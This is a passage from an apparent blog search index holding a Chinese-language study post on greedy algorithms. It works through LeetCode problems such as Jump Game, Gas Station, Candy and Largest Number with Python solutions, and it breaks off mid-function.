class="number">2</span></span><br><span class="line">            odd = (mid - l) % <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> odd:</span><br><span class="line">                <span class="keyword">if</span> nums[mid] == nums[mid-<span class="number">1</span>]:</span><br><span class="line">                    l = mid + <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    r = mid - <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> nums[mid] == nums[mid-<span class="number">1</span>]:</span><br><span class="line">                    r = mid - <span class="number">2</span></span><br><span class="line">                <span class="keyword">elif</span> nums[mid] == nums[mid+<span class="number">1</span>]:</span><br><span class="line">                    l = mid + <span class="number">2</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> nums[mid]</span><br><span class="line">        <span class="keyword">return</span> nums[l]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DSA-greedy学习</title>
      <link href="/2024/06/03/DSA-greedy%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/06/03/DSA-greedy%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>感觉自己DSA还是不太行, 补一下贪心算法.</p><h1 id="remove-duplicate-letters">316. Remove Duplicate Letters</h1><p>Given a string <code>s</code>, remove duplicate letters so that every letter appears once and only once. You must make sure your result is the smallest in lexicographical order among all possible results.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Example 1:</span><br><span class="line">    Input: s = &quot;bcabc&quot;</span><br><span class="line">    Output: &quot;abc&quot;</span><br><span class="line"></span><br><span class="line">Example 2:</span><br><span class="line">    Input: s = &quot;cbacdcbc&quot;</span><br><span class="line">    Output: &quot;acdb&quot;</span><br></pre></td></tr></table></figure><h2 id="greedy-stack">greedy + stack</h2><p>太笨了, 完全想不出来. 这里用了last_occ存了最后出现的位置, 防止字符丢失, 然后用一个stack存字符, 只要stack的最后一个元素后续还有occurance并且stack[-1]比当前大, 我们就直接把stack里面的元素丢掉.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">removeDuplicateLetters</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        stack = []</span><br><span class="line">        seen = <span class="built_in">set</span>()</span><br><span class="line">        last_occ = &#123;c: i <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(s)&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(s):</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> seen:</span><br><span class="line">                <span class="keyword">while</span> stack <span class="keyword">and</span> c &lt; stack[-<span class="number">1</span>] <span class="keyword">and</span> i &lt; last_occ[stack[-<span class="number">1</span>]]:</span><br><span class="line">                    seen -= &#123;stack.pop()&#125;</span><br><span class="line">                seen.add(c)</span><br><span class="line">                stack.append(c)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(stack)</span><br></pre></td></tr></table></figure><p>难点在于子问题的解决, 即只要不影响最终结果(i &lt; last_occ[stack[-1]]), 我们就可以丢弃stack里的值换更小的value(c &lt; stack[-1]).</p><h1 id="jump-game">55. Jump Game</h1><p>You are given an integer array <code>nums</code>. You are initially positioned at the array's <strong>first index</strong>, and each element in the array represents your maximum jump length at that position.</p><p>Return <code>true</code> if you can reach the last index, or <code>false</code> otherwise.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Example 1:</span><br><span class="line">    Input: nums = [2,3,1,1,4]</span><br><span class="line">    Output: true</span><br><span class="line">    Explanation: Jump 1 step from index 0 to 1, then 3 steps to the last index.</span><br><span class="line"></span><br><span class="line">Example 2:</span><br><span class="line">    Input: nums = [3,2,1,0,4]</span><br><span class="line">    Output: false</span><br><span class="line">    Explanation: You will always arrive at index 3 no matter what. Its maximum jump length is 0, which makes it impossible to reach the last index.</span><br></pre></td></tr></table></figure><h2 id="dp">dp</h2><p>第一感觉是dp, 也确实ac了, 但是时间复杂度太高了.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">canJump</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        dp = [<span class="literal">False</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums))]</span><br><span class="line">        dp[-<span class="number">1</span>] = <span class="literal">True</span></span><br><span class="line">        n = <span class="built_in">len</span>(nums)</span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n-<span class="number">2</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            v = nums[i]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(v+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> i+j &lt; n:</span><br><span class="line">                    <span class="keyword">if</span> dp[i+j] == <span class="literal">True</span> <span class="keyword">and</span> dp[i]==<span class="literal">False</span>:</span><br><span class="line">                        dp[i] = <span class="literal">True</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> dp[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><h2 id="greedy">greedy</h2><p>本质思路是直接遍历列表, 对于每个元素, 我们在遍历其大小的时候选择使剩余step最大的方案. 如果某个步骤剩余step到了0, 就说明到不了终点,返回False.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">canJump</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="keyword">if</span> count &lt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">elif</span> i &gt; count:</span><br><span class="line">                count = i</span><br><span class="line">            count -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><h1 id="jump-game-ii">45. Jump Game II</h1><p>You are given a <strong>0-indexed</strong> array of integers <code>nums</code> of length <code>n</code>. You are initially positioned at <code>nums[0]</code>.</p><p>Each element <code>nums[i]</code> represents the maximum length of a forward jump from index <code>i</code>. In other words, if you are at <code>nums[i]</code>, you can jump to any <code>nums[i + j]</code> where:</p><p><code>0 &lt;= j &lt;= nums[i]</code> and <code>i + j &lt; n</code></p><p>Return the minimum number of jumps to reach <code>nums[n - 1]</code>. The test cases are generated such that you can reach <code>nums[n - 1]</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Example 1:</span><br><span class="line">    Input: nums = [2,3,1,1,4]</span><br><span class="line">    Output: 2</span><br><span class="line">    Explanation: The minimum number of jumps to reach the last index is 2. Jump 1 step from index 0 to 1, then 3 steps to the last index.</span><br><span class="line"></span><br><span class="line">Example 2:</span><br><span class="line">    Input: nums = [2,3,0,1,4]</span><br><span class="line">    Output: 2</span><br></pre></td></tr></table></figure><h2 id="greedy-1">greedy</h2><p>每次跳的区间都划分出来, 实际时间复杂度O(n), 空间复杂度O(1).</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">jump</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        prev = <span class="literal">None</span></span><br><span class="line">        curr = <span class="number">0</span></span><br><span class="line">        furthest = <span class="number">0</span></span><br><span class="line">        n = <span class="built_in">len</span>(nums)</span><br><span class="line">        ans = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> furthest &lt; n - <span class="number">1</span>:</span><br><span class="line">            ans += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> prev <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                furthest = nums[curr]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(prev+<span class="number">1</span>, curr+<span class="number">1</span>):</span><br><span class="line">                    furthest = <span class="built_in">max</span>(furthest, i + nums[i])</span><br><span class="line">            prev = curr</span><br><span class="line">            curr = furthest</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure><h1 id="longest-palindrome">409. Longest Palindrome</h1><p>打卡题</p><p>Given a string <code>s</code> which consists of lowercase or uppercase letters, return the length of the <strong>longest palindrome</strong> that can be built with those letters.</p><p>Letters are case sensitive, for example, "Aa" is not considered a palindrome.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Example 1:</span><br><span class="line">    Input: s = &quot;abccccdd&quot;</span><br><span class="line">    Output: 7</span><br><span class="line">    Explanation: One longest palindrome that can be built is &quot;dccaccd&quot;, whose length is 7.</span><br><span class="line"></span><br><span class="line">Example 2:</span><br><span class="line">    Input: s = &quot;a&quot;</span><br><span class="line">    Output: 1</span><br><span class="line">    Explanation: The longest palindrome that can be built is &quot;a&quot;, whose length is 1.</span><br></pre></td></tr></table></figure><p>偶数全加,奇数-1然后全加, 最后如果存在奇数就+1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">longestPalindrome</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        ctr = Counter(s)</span><br><span class="line">        ans = <span class="number">0</span></span><br><span class="line">        exist = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> ctr.items():</span><br><span class="line">            <span class="keyword">if</span> v%<span class="number">2</span>:</span><br><span class="line">                ans += v - <span class="number">1</span></span><br><span class="line">                exist = <span class="number">1</span> </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ans += v</span><br><span class="line">        <span class="keyword">return</span> ans + exist</span><br></pre></td></tr></table></figure><h1 id="best-time-to-buy-and-sell-stock-ii">122. Best Time to Buy and Sell Stock II</h1><p>You are given an integer array prices where prices[i] is the price of a given stock on the ith day.</p><p>On each day, you may decide to buy and/or sell the stock. You can only hold at most one share of the stock at any time. However, you can buy it then immediately sell it on the same day.</p><p>Find and return the <strong>maximum</strong> profit you can achieve.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Example 1:</span><br><span class="line">    Input: prices = [7,1,5,3,6,4]</span><br><span class="line">    Output: 7</span><br><span class="line">    Explanation: Buy on day 2 (price = 1) and sell on day 3 (price = 5), profit = 5-1 = 4.</span><br><span class="line">    Then buy on day 4 (price = 3) and sell on day 5 (price = 6), profit = 6-3 = 3.</span><br><span class="line">    Total profit is 4 + 3 = 7.</span><br><span class="line"></span><br><span class="line">Example 2:</span><br><span class="line">    Input: prices = [1,2,3,4,5]</span><br><span class="line">    Output: 4</span><br><span class="line">    Explanation: Buy on day 1 (price = 1) and sell on day 5 (price = 5), profit = 5-1 = 4.</span><br><span class="line">    Total profit is 4.</span><br><span class="line"></span><br><span class="line">Example 3:</span><br><span class="line">    Input: prices = [7,6,4,3,1]</span><br><span class="line">    Output: 0</span><br><span class="line">    Explanation: There is no way to make a positive profit, so we never buy the stock to achieve the maximum profit of 0.</span><br></pre></td></tr></table></figure><p>从a到b再从b到c相当于从a到c,所以我们只需要捕捉所有局部增量即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">maxProfit</span>(<span class="params">self, prices: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        ans = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(prices) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(prices)-<span class="number">1</span>):</span><br><span class="line">            v = prices[i+<span class="number">1</span>] - prices[i]</span><br><span class="line">            <span class="keyword">if</span> v &gt; <span class="number">0</span>:</span><br><span class="line">                ans += v </span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure><h1 id="gas-station">134. Gas Station</h1><p>There are <code>n</code> gas stations along a circular route, where the amount of gas at the <code>ith</code> station is <code>gas[i]</code>.</p><p>You have a car with an unlimited gas tank and it costs <code>cost[i]</code> of gas to travel from the <code>ith</code> station to its next <code>(i + 1)th</code> station. You begin the journey with an empty tank at one of the gas stations.</p><p>Given two integer arrays <code>gas</code> and <code>cost</code>, return the starting gas station's index if you can travel around the circuit once in the clockwise direction, otherwise return <code>-1</code>. If there exists a solution, it is guaranteed to be unique.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Example 1:</span><br><span class="line">    Input: gas = [1,2,3,4,5], cost = [3,4,5,1,2]</span><br><span class="line">    Output: 3</span><br><span class="line">    Explanation:</span><br><span class="line">    Start at station 3 (index 3) and fill up with 4 unit of gas. Your tank = 0 + 4 = 4</span><br><span class="line">    Travel to station 4. Your tank = 4 - 1 + 5 = 8</span><br><span class="line">    Travel to station 0. Your tank = 8 - 2 + 1 = 7</span><br><span class="line">    Travel to station 1. Your tank = 7 - 3 + 2 = 6</span><br><span class="line">    Travel to station 2. Your tank = 6 - 4 + 3 = 5</span><br><span class="line">    Travel to station 3. The cost is 5. Your gas is just enough to travel back to station 3.</span><br><span class="line">    Therefore, return 3 as the starting index.</span><br><span class="line"></span><br><span class="line">Example 2:</span><br><span class="line">    Input: gas = [2,3,4], cost = [3,4,3]</span><br><span class="line">    Output: -1</span><br><span class="line">    Explanation:</span><br><span class="line">    You can&#x27;t start at station 0 or 1, as there is not enough gas to travel to the next station.</span><br><span class="line">    Let&#x27;s start at station 2 and fill up with 4 unit of gas. Your tank = 0 + 4 = 4</span><br><span class="line">    Travel to station 0. Your tank = 4 - 3 + 2 = 3</span><br><span class="line">    Travel to station 1. Your tank = 3 - 3 + 3 = 3</span><br><span class="line">    You cannot travel back to station 2, as it requires 4 unit of gas but you only have 3.</span><br><span class="line">    Therefore, you can&#x27;t travel around the circuit once no matter where you start.</span><br></pre></td></tr></table></figure><p>最经典的贪心</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">canCompleteCircuit</span>(<span class="params">self, gas: <span class="type">List</span>[<span class="built_in">int</span>], cost: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        n = <span class="built_in">len</span>(gas)</span><br><span class="line">        tank = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">sum</span>(gas) - <span class="built_in">sum</span>(cost) &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">        ans = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            tank += gas[i] - cost[i]</span><br><span class="line">            <span class="keyword">if</span> tank &gt; <span class="number">0</span> <span class="keyword">and</span> ans <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                ans = i</span><br><span class="line">            <span class="keyword">if</span> tank &lt; <span class="number">0</span>:</span><br><span class="line">                tank = <span class="number">0</span></span><br><span class="line">                ans = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure><h1 id="candy">135. Candy</h1><p>There are <code>n</code> children standing in a line. Each child is assigned a rating value given in the integer array ratings.</p><p>You are giving candies to these children subjected to the following requirements:</p><ul><li><p>Each child must have at least one candy.</p></li><li><p>Children with a higher rating get more candies than their neighbors.</p></li></ul><p>Return the minimum number of candies you need to have to distribute the candies to the children.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Example 1:</span><br><span class="line">    Input: ratings = [1,0,2]</span><br><span class="line">    Output: 5</span><br><span class="line">    Explanation: You can allocate to the first, second and third child with 2, 1, 2 candies respectively.</span><br><span class="line"></span><br><span class="line">Example 2:</span><br><span class="line">    Input: ratings = [1,2,2]</span><br><span class="line">    Output: 4</span><br><span class="line">    Explanation: You can allocate to the first, second and third child with 1, 2, 1 candies respectively.</span><br><span class="line">    The third child gets 1 candy because it satisfies the above two conditions.</span><br></pre></td></tr></table></figure><p>思路其实是基于peak和vallay, 初始化所有child的candy为1, 设置一个peak和vallay</p><p>递增的时候: peak+1, 糖果加peak</p><p>递减的时候: vallay+1, 糖果加vallay</p><p>相等的时候糖果依然为1,直接跳过</p><p>递增结束或递减结束的时候peak和vallay相应置0</p><p>然后每次找到一个趋势变换点都减掉peak和vallay里面的最小值(peak只能取较大值), 遍历到结束即获得所有糖果总数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">candy</span>(<span class="params">self, ratings: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        n = <span class="built_in">len</span>(ratings)</span><br><span class="line">        total_candies = n</span><br><span class="line">        i = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> i &lt; n:</span><br><span class="line">            <span class="keyword">if</span> ratings[i] == ratings[i - <span class="number">1</span>]:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            current_peak = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span> i &lt; n <span class="keyword">and</span> ratings[i] &gt; ratings[i - <span class="number">1</span>]:</span><br><span class="line">                current_peak += <span class="number">1</span></span><br><span class="line">                total_candies += current_peak</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> i == n:</span><br><span class="line">                <span class="keyword">return</span> total_candies</span><br><span class="line"></span><br><span class="line">            current_valley = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span> i &lt; n <span class="keyword">and</span> ratings[i] &lt; ratings[i - <span class="number">1</span>]:</span><br><span class="line">                current_valley += <span class="number">1</span></span><br><span class="line">                total_candies += current_valley</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            total_candies -= <span class="built_in">min</span>(current_peak, current_valley)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> total_candies</span><br></pre></td></tr></table></figure><h1 id="largest-number">179. Largest Number</h1><p>Given a list of non-negative integers nums, arrange them such that they form the largest number and return it.</p><p>Since the result may be very large, so you need to return a string instead of an integer.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Example 1:</span><br><span class="line">    Input: nums = [10,2]</span><br><span class="line">    Output: &quot;210&quot;</span><br><span class="line"></span><br><span class="line">Example 2:</span><br><span class="line">    Input: nums = [3,30,34,5,9]</span><br><span class="line">    Output: &quot;9534330&quot;</span><br></pre></td></tr></table></figure><p>与其说是greedy不如说是sort. 第一次知道sorted里面可以带cmp_to_key这种东西</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> cmp_to_key</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">largestNumber</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">mycmp</span>(<span class="params">x, y</span>):</span><br><span class="line">            <span class="keyword">if</span> x+y &gt; y+x:</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> x == y:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">sorted</span>(<span class="built_in">map</span>(<span class="built_in">str</span>,nums), key=cmp_to_key(mycmp))).lstrip(<span class="string">&#x27;0&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;0&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="create-maximum-number">321. Create Maximum Number</h1><p>You are given two integer arrays <code>nums1</code> and <code>nums2</code> of lengths <code>m</code> and <code>n</code> respectively. <code>nums1</code> and <code>nums2</code> represent the digits of two numbers. You are also given an integer <code>k</code>.</p><p>Create the maximum number of length <code>k &lt;= m + n</code> from digits of the two numbers. The relative order of the digits from the same array must be preserved.</p><p>Return an array of the <code>k</code> digits representing the answer.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Example 1:</span><br><span class="line">    Input: nums1 = [3,4,6,5], nums2 = [9,1,2,5,8,3], k = 5</span><br><span class="line">    Output: [9,8,6,5,3]</span><br><span class="line"></span><br><span class="line">Example 2:</span><br><span class="line">    Input: nums1 = [6,7], nums2 = [6,0,4], k = 5</span><br><span class="line">    Output: [6,7,6,0,4]</span><br><span class="line"></span><br><span class="line">Example 3:</span><br><span class="line">    Input: nums1 = [3,9], nums2 = [8,9], k = 3</span><br><span class="line">    Output: [9,8,9]</span><br></pre></td></tr></table></figure><p>个人感觉挺难的一道题, 本质是monostack+merge. 没写出来, 看的别人的solution. 考虑过monostack,但是感觉略微有些区别, 记录一下.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">maxNumber</span>(<span class="params">self, nums1: <span class="type">List</span>[<span class="built_in">int</span>], nums2: <span class="type">List</span>[<span class="built_in">int</span>], k: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">l1, l2</span>):</span><br><span class="line">            ret = []</span><br><span class="line">            <span class="keyword">while</span> l1 <span class="keyword">or</span> l2:</span><br><span class="line">                <span class="keyword">if</span> l1 &gt; l2:</span><br><span class="line">                    ret.append(l1.pop(<span class="number">0</span>))</span><br><span class="line">                <span 